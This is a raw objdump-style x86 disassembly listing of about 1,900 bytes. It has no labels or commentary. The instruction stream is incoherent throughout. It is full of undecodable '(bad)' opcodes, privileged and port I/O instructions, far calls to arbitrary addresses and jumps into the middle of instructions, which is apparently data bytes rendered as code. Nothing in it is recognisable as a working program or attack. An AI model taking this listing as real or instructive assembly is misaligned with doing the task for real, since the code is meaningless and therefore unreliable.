  4113ab:	outs   dx,BYTE PTR ds:[esi]
  4113ac:	xor    ecx,esi
  4113ae:	into   
  4113af:	jp     0x4113b0
  4113b1:	mov    cl,0x92
  4113b3:	call   0xd6d3:0x59ba05c3
  4113ba:	cmp    al,0x73
  4113bc:	rcr    BYTE PTR [edx],cl
  4113be:	or     DWORD PTR ds:[ecx+ebx*2+0x15a89b8f],edi
  4113c6:	jno    0x411439
  4113c8:	loope  0x4113cb
  4113ca:	sub    bl,BYTE PTR [edx+0x74]
  4113cd:	popa   
  4113ce:	or     al,cl
  4113d0:	scas   al,BYTE PTR es:[edi]
  4113d1:	pop    edx
  4113d2:	pop    esp
  4113d3:	ret    0x7f7
  4113d6:	sub    ecx,DWORD PTR [ebp+0x378301f9]
  4113dc:	xchg   edi,eax
  4113dd:	scas   al,BYTE PTR es:[edi]
  4113de:	adc    BYTE PTR [ecx],cl
  4113e0:	or     al,0xb8
  4113e2:	xor    eax,0x825042df
  4113e7:	(bad)  [eax]
  4113e9:	push   edi
  4113ea:	jno    0x41138c
  4113ec:	sbb    BYTE PTR [edi],ah
  4113ee:	mov    bl,0x4
  4113f0:	xor    eax,0xaf92dcac
  4113f5:	rcr    DWORD PTR [eax],0xff
  4113f8:	mov    edi,0x6a50fe12
  4113fd:	xchg   ebx,eax
  4113fe:	adc    al,0x5b
  411400:	popf   
  411401:	in     al,dx
  411402:	js     0x411402
  411404:	push   0x1b4c3d6c
  411409:	call   0x97a2:0x6e2a5b31
  411410:	jl     0x4113b7
  411412:	xchg   ecx,eax
  411413:	jb     0x411468
  411415:	fdiv   st(4),st
  411417:	adc    BYTE PTR [edx+0x4a],dl
  41141a:	outs   dx,BYTE PTR ds:[esi]
  41141b:	fninit 
  41141d:	mov    eax,0x6ef2f7c8
  411422:	cmp    al,0x87
  411424:	pop    es
  411425:	pop    eax
  411426:	jmp    0x411477
  411428:	pop    eax
  411429:	les    esp,FWORD PTR [eax-0x48]
  41142c:	ficomp WORD PTR gs:[esi-0x4702e650]
  411433:	push   esp
  411434:	arpl   WORD PTR [ecx],si
  411436:	adc    esi,0xffffff94
  411439:	push   ss
  41143a:	sbb    al,0x84
  41143c:	out    0xed,al
  41143e:	jb     0x41145b
  411440:	sub    DWORD PTR ds:0xc48c874c,esi
  411446:	jbe    0x41140b
  411448:	js     0x411473
  41144a:	lods   al,BYTE PTR ds:[esi]
  41144b:	mov    cl,0xea
  41144d:	in     al,dx
  41144e:	fnclex 
  411450:	sub    DWORD PTR [esi+edx*1-0x4d2f055c],ebx
  411457:	and    ebp,edx
  411459:	push   0x9118c07d
  41145e:	push   ebp
  41145f:	and    al,0x24
  411461:	aam    0x84
  411463:	and    DWORD PTR [edx],edi
  411465:	fnstenv [eax]
  411467:	xor    al,0xb3
  411469:	inc    ebp
  41146a:	icebp  
  41146b:	mov    ch,BYTE PTR ds:0xd9867fe
  411471:	aam    0xa0
  411473:	cdq    
  411474:	inc    esi
  411475:	adc    al,0x4b
  411477:	xor    BYTE PTR [ecx],cl
  411479:	addr16 (bad) 
  41147b:	(bad)  
  41147c:	ds inc edi
  41147e:	rcr    BYTE PTR [ebx-0x32],0x4d
  411482:	xor    BYTE PTR [ebp+0x36],dl
  411485:	loope  0x4114a6
  411487:	out    dx,al
  411488:	inc    esi
  411489:	lds    eax,FWORD PTR [ecx+eax*4+0x5a227976]
  411490:	or     al,BYTE PTR [ebx+0x1f78fc9]
  411496:	daa    
  411497:	inc    ebp
  411498:	ret    0xddef
  41149b:	mov    ch,0xe8
  41149d:	repnz outs dx,DWORD PTR ds:[esi]
  41149f:	xchg   ecx,eax
  4114a0:	cwde   
  4114a1:	xchg   edi,eax
  4114a2:	xchg   esi,eax
  4114a3:	cmp    eax,0x23b1c1e
  4114a8:	fist   DWORD PTR [ecx+ebx*4+0x59f764e0]
  4114af:	scas   eax,DWORD PTR es:[edi]
  4114b0:	sub    BYTE PTR [ebx+0x3],bl
  4114b3:	sti    
  4114b4:	gs cwde 
  4114b6:	inc    DWORD PTR [esi]
  4114b8:	into   
  4114b9:	xchg   ch,cl
  4114bb:	test   BYTE PTR [ebx+0xea7fc83],bh
  4114c1:	xchg   BYTE PTR [ecx-0x1960ea05],ah
  4114c7:	dec    edx
  4114c8:	xchg   edi,eax
  4114c9:	cs adc eax,0x58a99637
  4114cf:	push   ebp
  4114d0:	mov    ecx,DWORD PTR [edi-0x39]
  4114d3:	mov    esi,0x691295b6
  4114d8:	mov    ecx,0x128531b2
  4114dd:	pop    esi
  4114de:	popf   
  4114df:	lds    edi,FWORD PTR [edx+0x7b19333e]
  4114e5:	cmp    edi,ecx
  4114e7:	fstp   TBYTE PTR [esi]
  4114e9:	jnp    0x4114c5
  4114eb:	jle    0x4114d1
  4114ed:	les    ebx,FWORD PTR [edx]
  4114ef:	leave  
  4114f0:	push   cs
  4114f1:	push   ebx
  4114f2:	adc    DWORD PTR [ebx],edx
  4114f4:	push   esp
  4114f5:	push   ebx
  4114f6:	inc    ebp
  4114f7:	clc    
  4114f8:	outs   dx,BYTE PTR ds:[esi]
  4114f9:	and    DWORD PTR [ebx-0x2a],esi
  4114fc:	adc    eax,0x2fa35b3c
  411501:	xchg   al,ch
  411503:	mov    eax,0x90bd6fb5
  411508:	mov    ds:0xce35a0ce,eax
  41150d:	retf   
  41150e:	fwait
  41150f:	adc    ecx,DWORD PTR [edx]
  411511:	mov    dh,0xa
  411513:	jb     0x411495
  411515:	mov    es,WORD PTR [ebp-0xf]
  411518:	mov    ebp,0x1523d0dd
  41151d:	lea    esi,[ecx]
  41151f:	idiv   BYTE PTR [ecx]
  411521:	lahf   
  411522:	pop    esi
  411523:	out    0x8d,al
  411525:	sub    ah,bl
  411527:	xchg   esp,eax
  411528:	pusha  
  411529:	xor    eax,0x7f383352
  41152e:	sahf   
  41152f:	pop    esp
  411530:	imul   edi,DWORD PTR [eax-0x4972c92c],0xb3db75e1
  41153a:	das    
  41153b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41153c:	aam    0x9c
  41153e:	stc    
  41153f:	fwait
  411540:	push   ebx
  411541:	mov    ch,BYTE PTR [edi+edx*1-0x6bfb56a7]
  411548:	pop    edx
  411549:	xor    ebx,ebx
  41154b:	fisttp WORD PTR [ebp+0x6b]
  41154e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41154f:	xor    DWORD PTR [ebp+0x6b0c72f5],0x19dc8774
  411559:	ds pop es
  41155b:	fwait
  41155c:	aaa    
  41155d:	pop    eax
  41155e:	sub    edx,DWORD PTR [eax]
  411560:	xchg   edi,eax
  411561:	lahf   
  411562:	xor    eax,0xa0916f3c
  411567:	ret    0x6f8d
  41156a:	dec    ecx
  41156b:	and    DWORD PTR [ebx-0x37e9b7e7],edi
  411571:	mov    bl,ch
  411573:	inc    ebx
  411574:	sar    BYTE PTR [edi+0x2e],cl
  411577:	loope  0x41151f
  411579:	js     0x41156b
  41157b:	sbb    al,0xcd
  41157d:	pop    eax
  41157e:	adc    esi,DWORD PTR [edi+ebx*4-0x2d3fd492]
  411585:	jle    0x411593
  411587:	dec    edx
  411588:	shl    BYTE PTR [ebx+ebp*2+0x1dd5348f],0x6c
  411590:	(bad)  
  411591:	mov    dh,0xb0
  411593:	mov    bh,0xb4
  411595:	adc    esp,ebp
  411597:	and    al,0x6
  411599:	test   al,0xb5
  41159b:	enter  0x381,0x54
  41159f:	fdivr  QWORD PTR [ecx]
  4115a1:	sbb    eax,0x28f5274c
  4115a6:	sahf   
  4115a7:	inc    ebp
  4115a8:	in     al,dx
  4115a9:	ret    
  4115aa:	shl    DWORD PTR [ecx],0x2b
  4115ad:	lods   eax,DWORD PTR ds:[esi]
  4115ae:	push   es
  4115af:	pop    esp
  4115b0:	jmp    0x411592
  4115b2:	cdq    
  4115b3:	retf   
  4115b4:	dec    edx
  4115b5:	xor    eax,0x6abe5bda
  4115ba:	imul   edx,DWORD PTR [esi+0xbeb8f86],0xffffff9d
  4115c1:	and    edi,DWORD PTR [edi+0xd0dbea]
  4115c7:	push   edx
  4115c8:	jno    0x41158f
  4115ca:	(bad)  
  4115cb:	fidivr WORD PTR [edx-0x57]
  4115ce:	and    al,0xbb
  4115d0:	mov    al,0x97
  4115d2:	or     al,0xd1
  4115d4:	mov    bl,0x21
  4115d6:	aad    0x32
  4115d8:	cwde   
  4115d9:	hlt    
  4115da:	jb     0x411591
  4115dc:	or     eax,0x677d26a9
  4115e1:	xchg   esi,eax
  4115e2:	and    al,0xfc
  4115e4:	inc    ebp
  4115e5:	and    ecx,DWORD PTR [eax-0x77281412]
  4115eb:	mov    cl,0x77
  4115ed:	push   cs
  4115ee:	sbb    ebp,ebp
  4115f0:	push   es
  4115f1:	popa   
  4115f2:	jge    0x41164e
  4115f4:	sub    bh,bl
  4115f6:	and    bl,bh
  4115f8:	pop    ecx
  4115f9:	adc    dl,0x3d
  4115fc:	shl    DWORD PTR [edi-0x72],0xfb
  411600:	xchg   DWORD PTR [ebx+ebp*1],eax
  411603:	test   DWORD PTR [ebx],eax
  411605:	aas    
  411606:	sub    DWORD PTR [eax+0x2bd38cbc],ecx
  41160c:	jp     0x4115aa
  41160e:	mov    esi,0xb2d3ea5b
  411613:	arpl   WORD PTR [edx+eiz*8],cx
  411616:	adc    DWORD PTR [edi],edx
  411618:	dec    ebp
  411619:	mov    ds:0xf75de76c,al
  41161f:	add    esi,0xfffffff8
  411622:	test   eax,0xaac5395
  411627:	add    dl,BYTE PTR [edi-0x8]
  41162a:	cmp    al,0x12
  41162c:	cmp    BYTE PTR [esi-0x52],ch
  41162f:	shl    DWORD PTR ds:0x4f8ad5b3,cl
  411635:	ret    0xbed2
  411638:	(bad)  [ebx]
  41163a:	push   ebx
  41163b:	pop    ecx
  41163d:	or     edi,DWORD PTR [ecx-0x11]
  411640:	xor    BYTE PTR [ecx+0x37],0x6
  411644:	sub    al,0xe0
  411646:	or     DWORD PTR [edi+0x26bf717c],ecx
  41164c:	dec    ebp
  41164d:	cld    
  41164e:	and    edx,DWORD PTR [ebx-0x17a137db]
  411654:	sub    BYTE PTR [ebx+0xdd10c97],ch
  41165a:	stos   DWORD PTR es:[edi],eax
  41165b:	mov    ds:0xc1867052,eax
  411660:	push   esi
  411661:	cdq    
  411662:	cmp    ebx,ecx
  411664:	ins    DWORD PTR es:[edi],dx
  411665:	add    ebp,DWORD PTR [ebx-0x6a2627f]
  41166b:	xor    ebp,DWORD PTR [eax-0x51]
  41166e:	popa   
  41166f:	data16 sbb ah,bh
  411672:	enter  0x799a,0xe
  411676:	push   esp
  411677:	(bad)  
  411678:	jecxz  0x41165f
  41167a:	xchg   dl,ah
  41167c:	mov    al,ds:0xecdac04f
  411681:	sub    BYTE PTR [esi-0xe8709ed],al
  411687:	dec    ebp
  411688:	or     esi,DWORD PTR [ebx-0x3d]
  41168b:	adc    DWORD PTR [ecx+0x4c],eax
  41168e:	retf   
  41168f:	pop    edx
  411690:	aas    
  411691:	fwait
  411692:	add    DWORD PTR [ebx],edx
  411694:	scas   al,BYTE PTR es:[edi]
  411695:	clc    
  411696:	out    0xa,eax
  411698:	pusha  
  411699:	pusha  
  41169a:	fadd   DWORD PTR [edx]
  41169c:	out    0xdd,al
  41169e:	add    edx,DWORD PTR ds:0x7fd9cfbd
  4116a4:	ss or  esi,esp
  4116a7:	dec    edx
  4116a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116a9:	icebp  
  4116aa:	pop    eax
  4116ab:	xchg   edx,eax
  4116ac:	pop    ss
  4116ad:	sbb    eax,0xd8c06853
  4116b2:	loop   0x41168f
  4116b4:	aad    0x47
  4116b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116b7:	shl    BYTE PTR [ebx],1
  4116b9:	dec    eax
  4116ba:	pop    es
  4116bb:	xchg   esi,eax
  4116bc:	lea    edx,[ecx+eiz*8+0x75]
  4116c0:	add    BYTE PTR [edx+0x24],dh
  4116c3:	int3   
  4116c4:	shl    BYTE PTR [edx+0xa],cl
  4116c7:	jcxz   0x41172a
  4116ca:	bound  ebp,QWORD PTR ds:[edi+0x6bd13e9]
  4116d1:	push   ebx
  4116d2:	or     esp,DWORD PTR ds:[esp+edx*1-0x58146eb3]
  4116da:	mov    ch,0x2a
  4116dc:	push   ebx
  4116dd:	and    al,0x92
  4116df:	repnz popf 
  4116e1:	adc    ebx,eax
  4116e3:	xor    DWORD PTR [eax-0x6f976432],edi
  4116e9:	daa    
  4116ea:	out    dx,al
  4116eb:	mov    WORD PTR [esi+0x33],ss
  4116ee:	(bad)  
  4116ef:	repnz popf 
  4116f1:	daa    
  4116f2:	add    eax,0xdb27e105
  4116f7:	cwde   
  4116f8:	mov    edx,0x8b20df15
  4116fd:	push   ds
  4116fe:	and    ecx,DWORD PTR [edi+0x226cd88d]
  411704:	and    al,0x0
  411706:	in     al,0x9f
  411708:	clc    
  411709:	hlt    
  41170a:	sbb    BYTE PTR [edx-0x2ee9e128],ah
  411710:	or     bh,BYTE PTR [ebx]
  411712:	out    dx,al
  411713:	mov    ebx,0x379eb4d2
  411718:	sbb    ch,BYTE PTR [ecx+ecx*8]
  41171b:	daa    
  41171c:	cld    
  41171d:	(bad)  
  41171e:	iret   
  41171f:	fsubr  DWORD PTR [edi+0x66]
  411722:	fwait
  411723:	jmp    0x41171f
  411725:	sub    eax,0x72a82116
  41172a:	das    
  41172b:	mov    eax,ds:0x76592904
  411730:	pushf  
  411731:	(bad)  
  411732:	ins    DWORD PTR es:[edi],dx
  411733:	stc    
  411734:	je     0x4117a7
  411736:	scas   al,BYTE PTR es:[edi]
  411737:	sti    
  411738:	jg     0x41171e
  41173a:	adc    eax,0x7a16f444
  41173f:	cmp    esi,DWORD PTR [ebp-0x5ce903ef]
  411745:	push   esp
  411746:	jne    0x4116db
  411748:	popa   
  411749:	(bad)  
  41174a:	in     al,dx
  41174b:	ds in  eax,dx
  41174d:	cmp    cl,BYTE PTR [ebx]
  41174f:	xchg   esi,eax
  411750:	iret   
  411751:	or     BYTE PTR [ebp+0x35d4f7a5],ah
  411757:	mov    edi,DWORD PTR [edx+0x6b2ce3ce]
  41175d:	mov    edi,DWORD PTR [edx+0x60]
  411760:	imul   eax,ebp,0xffffff95
  411763:	jmp    0x3710:0x77ff76d6
  41176a:	cwde   
  41176b:	jae    0x4117c9
  41176d:	sub    DWORD PTR [edx+ebx*2],ecx
  411770:	add    eax,ebp
  411772:	nop
  411773:	sti    
  411774:	ds or  eax,0x979fd5f0
  41177a:	adc    al,0xd0
  41177c:	sahf   
  41177d:	pushf  
  41177e:	aaa    
  41177f:	call   0x89a9:0x50feeb9d
  411786:	jae    0x411803
  411788:	and    dh,BYTE PTR [ebp+0x4b]
  41178b:	sub    BYTE PTR [esi-0x36],dh
  41178e:	call   0x787a69b6
  411793:	adc    ch,BYTE PTR [ecx-0x54]
  411796:	arpl   bx,ax
  411798:	cmc    
  411799:	in     eax,dx
  41179a:	pushf  
  41179b:	xor    ebx,DWORD PTR [ecx]
  41179d:	sbb    BYTE PTR [ebx+0x61],cl
  4117a0:	sbb    DWORD PTR [edi+0x8d6993],0x60
  4117a7:	js     0x41176d
  4117a9:	sar    bh,0x7
  4117ac:	enter  0x7307,0xa9
  4117b0:	pop    edi
  4117b1:	push   cs
  4117b2:	cmc    
  4117b3:	scas   al,BYTE PTR es:[edi]
  4117b4:	dec    ebx
  4117b5:	(bad)  
  4117b7:	inc    edi
  4117b8:	aaa    
  4117b9:	in     eax,0x7
  4117bb:	ja     0x41176b
  4117bd:	pop    ss
  4117be:	mov    edx,0xff48a281
  4117c3:	popf   
  4117c4:	sbb    ebp,ebp
  4117c6:	xor    dl,BYTE PTR [ecx]
  4117c8:	mov    cs,edi
  4117ca:	into   
  4117cb:	cmc    
  4117cc:	rcr    BYTE PTR [edi+0x1e],cl
  4117cf:	in     eax,0xac
  4117d1:	cli    
  4117d2:	xchg   esp,esi
  4117d4:	xor    eax,DWORD PTR [ecx-0x40]
  4117d7:	sub    esp,DWORD PTR [ebx]
  4117d9:	mov    bh,0xb0
  4117db:	inc    ecx
  4117dc:	aaa    
  4117dd:	pop    ds
  4117de:	cmp    bh,ch
  4117e0:	(bad)  
  4117e1:	xor    eax,edi
  4117e3:	call   DWORD PTR [eax]
  4117e5:	nop
  4117e6:	mov    cl,0x2
  4117e8:	jp     0x41184b
  4117ea:	sub    eax,0x8f51c27e
  4117ef:	add    eax,DWORD PTR [edi+0x219f4f2e]
  4117f5:	bound  esi,QWORD PTR [ebp-0x48fd13e9]
  4117fb:	sbb    BYTE PTR [ebx*1-0x5e84a2fd],ch
  411802:	dec    edx
  411803:	inc    esp
  411804:	fs adc eax,0xf3e9c767
  41180a:	stos   DWORD PTR es:[edi],eax
  41180b:	sbb    cl,dh
  41180d:	pusha  
  41180e:	add    eax,edi
  411810:	fild   DWORD PTR [edx+0x36dd78a0]
  411816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411817:	or     ah,BYTE PTR [ecx+ebx*8+0x57a75dfb]
  41181e:	ss dec ebp
  411820:	cmp    dl,al
  411822:	mov    ds:0x8368cc07,al
  411827:	xlat   BYTE PTR ds:[ebx]
  411828:	jl     0x4117ea
  41182a:	cmp    bl,BYTE PTR [ebp+0x6e470c8b]
  411830:	jmp    0x411843
  411832:	int    0xa5
  411834:	lods   eax,DWORD PTR ds:[esi]
  411835:	mov    BYTE PTR ss:[ebx-0x47c8fa4f],bh
  41183c:	xchg   edi,eax
  41183d:	sbb    dh,BYTE PTR [esi]
  41183f:	inc    ecx
  411840:	rcr    DWORD PTR [esi],1
  411842:	add    al,ch
  411844:	into   
  411845:	sub    BYTE PTR [ebp-0x38814969],al
  41184b:	stos   DWORD PTR es:[edi],eax
  41184c:	push   ebp
  41184d:	icebp  
  41184e:	add    al,0xea
  411850:	das    
  411851:	cld    
  411852:	fldenv [ecx+0x29]
  411855:	mov    al,ds:0x457873eb
  41185a:	sub    eax,edx
  41185c:	fidivr DWORD PTR [ecx-0x56]
  41185f:	xor    DWORD PTR [ebp+0x55],0x34c08c71
  411866:	xor    DWORD PTR [edx-0x6d],esp
  411869:	mov    ah,0xdd
  41186b:	leave  
  41186c:	icebp  
  41186d:	cmp    eax,0x12b1f85f
  411872:	mov    al,0x16
  411874:	mov    dh,0x62
  411876:	fwait
  411877:	fwait
  411878:	inc    esp
  411879:	sahf   
  41187a:	inc    esi
  41187b:	adc    BYTE PTR [ebp-0x2ab87e0a],dh
  411881:	int    0x27
  411883:	ret    
  411884:	ret    0xc54c
  411887:	sub    DWORD PTR [ecx-0x1e],ecx
  41188a:	outs   dx,DWORD PTR ds:[esi]
  41188b:	and    BYTE PTR [ebp+0x21c11301],bh
  411891:	fdivr  st(1),st
  411893:	sahf   
  411894:	in     eax,dx
  411895:	xor    DWORD PTR [ecx+0x519b8285],edi
  41189b:	test   DWORD PTR [eax+0x6c],ebp
  41189e:	mov    fs,WORD PTR [ecx]
  4118a0:	sub    DWORD PTR [di],eax
  4118a3:	sub    eax,0xe8f5b6e2
  4118a8:	mov    DWORD PTR [ecx],eax
  4118aa:	push   edx
  4118ab:	mov    eax,ds:0x576fae3b
  4118b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118b1:	dec    esp
  4118b2:	scas   eax,DWORD PTR es:[edi]
  4118b3:	out    0xfc,al
  4118b5:	push   ebp
  4118b6:	mov    ds:0xc42689a0,eax
  4118bb:	add    BYTE PTR [edx],ch
  4118bd:	xchg   esp,eax
  4118be:	cli    
  4118bf:	push   ss
  4118c0:	mov    dl,0x2d
  4118c2:	mov    ecx,0x237fa2b
  4118c7:	mov    edx,0x4e062e73
  4118cc:	pop    es
  4118cd:	mov    BYTE PTR [edx-0x3],ch
  4118d0:	mov    dl,0x8a
  4118d2:	hlt    
  4118d3:	in     eax,dx
  4118d4:	xchg   ebx,eax
  4118d5:	push   edx
  4118d6:	xor    esp,DWORD PTR [ecx+0x67]
  4118d9:	loope  0x4118da
  4118db:	or     dh,ah
  4118dd:	and    al,0x3c
  4118df:	out    dx,eax
  4118e0:	dec    edx
  4118e1:	jp     0x41186f
  4118e3:	or     BYTE PTR [eax],dh
  4118e5:	jns    0x4118e1
  4118e7:	ss or  dh,bl
  4118ea:	jo     0x4118da
  4118ec:	(bad)  
  4118ed:	(bad)  cs:[ebp+0x62d07e48]
  4118f4:	push   eax
  4118f5:	clc    
  4118f6:	loope  0x41188b
  4118f8:	mov    eax,0x4d620235
  4118fd:	jne    0x41195e
  4118ff:	arpl   WORD PTR [ebx],bp
  411901:	js     0x4118dd
  411903:	rcr    BYTE PTR [ecx+0x41],1
  411906:	or     ah,BYTE PTR [ebp+eax*4+0x6f]
  41190a:	mov    esi,0x340c1086
  41190f:	ds lahf 
  411911:	and    DWORD PTR [ecx],esp
  411913:	lods   eax,DWORD PTR ds:[esi]
  411914:	mov    cs,WORD PTR [ecx]
  411916:	test   BYTE PTR [ecx-0x53],dh
  411919:	pusha  
  41191a:	into   
  41191b:	push   ebp
  41191c:	call   FWORD PTR [edi]
  41191e:	cmp    esp,ebx
  411920:	push   ecx
  411921:	enter  0x6522,0x64
  411925:	inc    esi
  411926:	add    DWORD PTR ds:0x79acaa1e,ebp
  41192c:	fld    DWORD PTR [eax]
  41192e:	mov    cl,cl
  411930:	mov    eax,ebp
  411932:	xor    BYTE PTR [eax+edi*8+0x0],ch
  411936:	clc    
  411937:	cld    
  411938:	mov    BYTE PTR [edx-0x4],al
  41193b:	jp     0x411975
  41193d:	xor    ebx,DWORD PTR [edi+0x74]
  411940:	dec    esi
  411941:	xchg   edi,eax
  411942:	cld    
  411943:	mov    ds:0x4dca67ba,al
  411948:	(bad)  
  411949:	adc    BYTE PTR [eax-0x61],0xbf
  41194d:	push   0xe3a5bba5
  411952:	jb     0x4119b5
  411954:	inc    edi
  411955:	mov    dh,0x17
  411957:	xchg   BYTE PTR ds:0xd158bda2,ch
  41195d:	jbe    0x4118e0
  41195f:	mov    edi,0x7094dcdb
  411964:	cmp    ecx,DWORD PTR [esi+0x7b]
  411967:	sub    DWORD PTR [ecx-0x244b2a11],ecx
  41196d:	mov    bh,0x42
  41196f:	xor    eax,0x3014a8e7
  411974:	retf   
  411975:	test   DWORD PTR [ebx+0x48],0x6da6e276
  41197c:	and    ebp,DWORD PTR [edi+0xa]
  41197f:	arpl   sp,dx
  411981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411982:	call   0xf2b11f3
  411987:	data16 mov cl,0xb4
  41198a:	xchg   ah,bh
  41198c:	bound  ebx,QWORD PTR [edx-0x4123d76d]
  411992:	aam    0xed
  411994:	les    eax,FWORD PTR [ebp+0x3be39e16]
  41199a:	ffree  st(1)
  41199c:	xor    al,0xc5
  41199e:	(bad)  
  41199f:	(bad)  
  4119a1:	addr16 sahf 
  4119a3:	push   cs
  4119a4:	push   edx
  4119a5:	in     al,dx
  4119a6:	dec    edx
  4119a7:	inc    ecx
  4119a8:	inc    edi
  4119a9:	adc    edx,edx
  4119ab:	mov    ecx,0x5501d040
  4119b0:	inc    edx
  4119b1:	add    eax,0x91aa00d8
  4119b6:	sbb    edi,DWORD PTR [esi]
  4119b8:	rcr    BYTE PTR [edx+0x1ab9cc90],0xdb
  4119bf:	ds dec eax
  4119c1:	(bad)  
  4119c2:	mov    esi,0xa906e28e
  4119c7:	cmp    DWORD PTR [esi+0x36cfa4fa],ebp
  4119cd:	sbb    DWORD PTR [eax-0x457f25c8],edi
  4119d3:	retf   0xb150
  4119d6:	pop    edx
  4119d7:	je     0x411a38
  4119d9:	lods   al,BYTE PTR ds:[esi]
  4119da:	in     al,0xfb
  4119dc:	xchg   edi,ebx
  4119de:	inc    eax
  4119df:	cli    
  4119e0:	imul   ebx,DWORD PTR [ebx-0x51],0x24
  4119e4:	xor    DWORD PTR [edx],ebx
  4119e6:	and    ebp,eax
  4119e8:	push   ds
  4119e9:	sub    BYTE PTR [esi],bl
  4119eb:	xor    ebp,edi
  4119ed:	jb     0x4119fe
  4119ef:	out    0x4b,eax
  4119f1:	in     al,dx
  4119f2:	jp     0x411a31
  4119f4:	mov    eax,ds:0x1429a029
  4119f9:	out    dx,eax
  4119fa:	push   ds
  4119fb:	cld    
  4119fc:	das    
  4119fd:	jp     0x411a4b
  4119ff:	cld    
  411a00:	lods   al,BYTE PTR ds:[esi]
  411a01:	jmp    0x3b99d9a4
  411a06:	lea    esi,[eax-0x7bfbe9ee]
  411a0c:	enter  0xfe35,0xe9
  411a10:	pop    es
  411a11:	and    al,0x72
  411a13:	jmp    0x411a87
  411a15:	ds popa 
  411a17:	mov    WORD PTR [ebp-0x27],gs
  411a1a:	lahf   
  411a1b:	push   ss
  411a1c:	sub    ebx,ebp
  411a1e:	repnz fiadd DWORD PTR [ebx-0x48c803d8]
  411a25:	push   ebx
  411a26:	mov    edx,0x1fded95d
  411a2b:	mov    al,0x55
  411a2d:	dec    edx
  411a2e:	hlt    
  411a2f:	dec    esi
  411a30:	repz sar DWORD PTR [esi],cl
  411a33:	and    BYTE PTR [esi],bl
  411a35:	retf   0xb0c0
  411a38:	xchg   ebx,eax
  411a39:	aas    
  411a3a:	dec    esp
  411a3b:	xchg   esp,eax
  411a3c:	popf   
  411a3d:	and    bh,dl
  411a3f:	aas    
  411a40:	(bad)  
  411a41:	mov    ds:0x3d8721a8,eax
  411a46:	rol    ebp,0xce
  411a49:	fwait
  411a4a:	pop    ebx
  411a4b:	jecxz  0x411a8a
  411a4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a4e:	ret    
  411a4f:	mov    esp,0x1a0278c7
  411a54:	sbb    BYTE PTR [edi-0x98b5bc7],0xda
  411a5b:	mov    esi,0x7f8664b0
  411a60:	add    bh,BYTE PTR [edi+0x67]
  411a63:	inc    eax
  411a64:	jae    0x411adc
  411a66:	imul   eax,DWORD PTR [eax+0xf],0x4e
  411a6a:	and    eax,0x7bd0b69
  411a6f:	sbb    esp,edi
  411a71:	fiadd  DWORD PTR [ebx+0x15]
  411a74:	aaa    
  411a75:	and    ebx,DWORD PTR [ebp-0x198ee4df]
  411a7b:	aaa    
  411a7c:	xor    DWORD PTR [edx],0xf2028685
  411a82:	enter  0xa05b,0xec
  411a86:	rcl    BYTE PTR [edx+0x4f],1
  411a89:	or     BYTE PTR [ebp-0x1e7710d],al
  411a8f:	out    0xae,eax
  411a91:	xlat   BYTE PTR ds:[ebx]
  411a92:	(bad)  
  411a93:	into   
  411a94:	jae    0x411a92
  411a96:	outs   dx,BYTE PTR ds:[esi]
  411a97:	xchg   DWORD PTR ds:0x996e6962,esp
  411a9d:	into   
  411a9e:	inc    ebp
  411a9f:	out    dx,eax
  411aa0:	xchg   edx,eax
  411aa1:	add    bl,BYTE PTR [edx]
  411aa3:	dec    BYTE PTR [edx+0x4c9e6ed9]
  411aa9:	rol    BYTE PTR [ecx+eiz*8],0xad
  411aad:	push   ebp
  411aae:	or     al,0x72
  411ab0:	jle    0x411b04
  411ab2:	adc    ch,bl
  411ab4:	mov    ecx,0x5576e0a4
  411ab9:	push   0x3a
  411abb:	add    edi,edx
  411abd:	xchg   esi,eax
  411abe:	xor    dh,bh
  411ac0:	mov    ah,BYTE PTR [esi-0x6f]
  411ac3:	cli    
  411ac4:	adc    al,0xc8
  411ac6:	scas   eax,DWORD PTR es:[edi]
  411ac7:	fcom   QWORD PTR [esi+eiz*8]
  411aca:	adc    BYTE PTR [edx-0x67],0x44
  411ace:	mov    ecx,0x8aca7869
  411ad3:	cmp    ecx,edi
  411ad5:	inc    edx
  411ad6:	hlt    
  411ad7:	push   cs
  411ad8:	int    0xfb
  411ada:	pop    esp
  411adb:	pop    eax
  411adc:	pop    ebx
  411add:	dec    ebx
  411ade:	xrelease mov DWORD PTR [edi-0x1c],ebx
  411ae2:	pop    ebp
  411ae4:	das    
  411ae5:	push   ecx
  411ae6:	and    al,0x71
  411ae8:	cmp    al,0x56
  411aea:	mov    esi,0xe901f331
  411aef:	mov    bl,0x39
  411af1:	mov    esi,DWORD PTR [ebp+0x7bca581a]
  411af7:	outs   dx,DWORD PTR ds:[esi]
  411af8:	hlt    
  411af9:	dec    edi
  411afa:	daa    
  411afb:	sbb    DWORD PTR [ebx-0x13952637],ecx
  411b01:	addr16 call 0x1931:0xb6cb9d84
  411b09:	rcl    DWORD PTR [ebx-0x38b900b0],1
  411b0f:	push   esp
  411b11:	ds jmp 0x411b86
  411b14:	ds pusha 
  411b16:	push   ss
  411b17:	xchg   ebp,eax
  411b18:	inc    ebx
  411b19:	cs pop edi
  411b1b:	cli    
  411b1c:	data16 mov al,ds:0x96381564
  411b22:	cdq    
  411b23:	xchg   edx,eax
  411b24:	fwait
  411b25:	test   eax,0xa2ad3d79
  411b2a:	adc    al,0x2b
  411b2c:	dec    eax
  411b2d:	cmp    edi,DWORD PTR [edi]
  411b2f:	mov    edx,0x22e99fa9
  411b34:	test   BYTE PTR [eax+edi*8+0x6c],cl
  411b38:	or     eax,DWORD PTR [ecx+0x3e]
  411b3b:	or     DWORD PTR [ecx],eax
  411b3d:	repz mov edx,ebx
  411b40:	add    eax,DWORD PTR [edi+0x59f171cd]
  411b46:	mov    eax,0xacd57c51
  411b4b:	test   DWORD PTR [edx-0x3e013193],esp
  411b51:	mov    BYTE PTR [edx+0xdf48cb7],0xd4
  411b58:	mov    DWORD PTR [ebp-0x731dd306],eax
  411b5e:	(bad)  
  411b5f:	or     BYTE PTR [ebp+0x54e5bcfd],bh
  411b65:	ror    BYTE PTR [ecx-0x57],1
  411b68:	pop    ebp
  411b69:	xchg   ecx,eax
  411b6a:	dec    esi
  411b6b:	inc    ecx
  411b6c:	gs sti 
